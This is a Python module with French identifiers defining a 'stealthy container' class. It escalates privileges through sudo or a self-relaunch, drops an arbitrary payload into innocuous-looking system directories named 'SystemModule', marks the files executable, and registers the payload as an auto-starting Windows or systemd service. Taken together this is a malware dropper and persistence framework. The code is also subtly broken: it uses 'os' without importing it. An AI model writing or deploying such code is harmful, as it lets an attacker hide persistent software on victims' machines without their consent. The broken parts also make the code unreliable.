import sys
import subprocess
import tempfile
import shutil
import platform
import ctypes
import winreg  # Pour Windows
import getpass
from pathlib import Path

class ConteneurFurtif:
    def __init__(self, conditions_ouverture: callable = None):
        self.conditions_ouverture = conditions_ouverture
        self.contenu = None
        self.est_deploye = False
        self.privileges_eleves = False
    
    def _verifier_conditions(self) -> bool:
        if self.conditions_ouverture:
            return self.conditions_ouverture()
        return True
    
    def _elever_privileges(self) -> bool:
        if self.privileges_eleves:
            return True
            
        system = platform.system()
        
        try:
            if system == "Windows":
                # Vérifier si déjà admin
                if ctypes.windll.shell32.IsUserAnAdmin():
                    self.privileges_eleves = True
                    return True
                
                # Tentative d'élévation
                result = subprocess.run([
                    sys.executable, __file__,
                    '--elevate'
                ], shell=True, capture_output=True)
                
                self.privileges_eleves = result.returncode == 0
                
            elif system in ["Linux", "Darwin"]:  # Linux/Mac
                if os.geteuid() == 0:
                    self.privileges_eleves = True
                    return True
                
                # Tentative sudo
                result = subprocess.run([
                    'sudo', sys.executable, __file__,
                    '--elevate'
                ], capture_output=True)
                
                self.privileges_eleves = result.returncode == 0
                
        except Exception:
            self.privileges_eleves = False
            
        return self.privileges_eleves
    
    def charger_contenu(self, contenu: any):
        self.contenu = contenu
    
    def ouvrir_conditionnel(self) -> bool:
        if not self._verifier_conditions():
            return False
        
        if not self._elever_privileges():
            return False
        
        return True
    
    def deployer_automatique(self, emplacement: str = None):
        if not self.ouvrir_conditionnel():
            raise PermissionError("Conditions d'ouverture non remplies")
        
        if not self.contenu:
            raise ValueError("Aucun contenu à déployer")
        
        # Déterminer l'emplacement de déploiement
        if not emplacement:
            system = platform.system()
            if system == "Windows":
                emplacement = r"C:\ProgramData\SystemModule"
            elif system == "Linux":
                emplacement = "/opt/system_module"
            elif system == "Darwin":
                emplacement = "/Library/Application Support/SystemModule"
        
        # Créer le répertoire
        Path(emplacement).mkdir(parents=True, exist_ok=True)
        
        # Déployer le contenu
        if isinstance(self.contenu, dict):
            self._deployer_fichiers(self.contenu, emplacement)
        elif callable(self.contenu):
            self.contenu(emplacement)
        
        self.est_deploye = True
        return emplacement
    
    def _deployer_fichiers(self, fichiers: dict, base_path: str):
        for nom_fichier, contenu in fichiers.items():
            chemin_complet = Path(base_path) / nom_fichier
            
            if isinstance(contenu, str):
                chemin_complet.write_text(contenu, encoding='utf-8')
            elif isinstance(contenu, bytes):
                chemin_complet.write_bytes(contenu)
            
            # Rendre exécutable si nécessaire
            if platform.system() != "Windows":
                if nom_fichier.endswith(('.sh', '.py', '')):
                    chemin_complet.chmod(0o755)
    
    def installer_service(self, nom_service: str, commande: str):
        if not self.privileges_eleves:
            raise PermissionError("Privilèges administrateur requis")
        
        system = platform.system()
        
        if system == "Windows":
            self._installer_service_windows(nom_service, commande)
        elif system in ["Linux", "Darwin"]:
            self._installer_service_unix(nom_service, commande)
    
    def _installer_service_windows(self, nom_service: str, commande: str):
        # Implémentation simplifiée pour Windows
        try:
            subprocess.run([
                'sc', 'create', nom_service,
                f'binPath= "{commande}"',
                'start= auto'
            ], check=True)
        except subprocess.CalledProcessError:
            pass
    
    def _installer_service_unix(self, nom_service: str, commande: str):
        # Implémentation simplifiée pour Unix
        service_content = f"""[Unit]
Description={nom_service}
After=network.target

[Service]
ExecStart={commande}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        
        service_path = f"/etc/systemd/system/{nom_service}.service"
        Path(service_path).write_text(service_content)
        subprocess.run(["systemctl", "enable", nom_service])
        subprocess.run(["systemctl", "start", nom_service])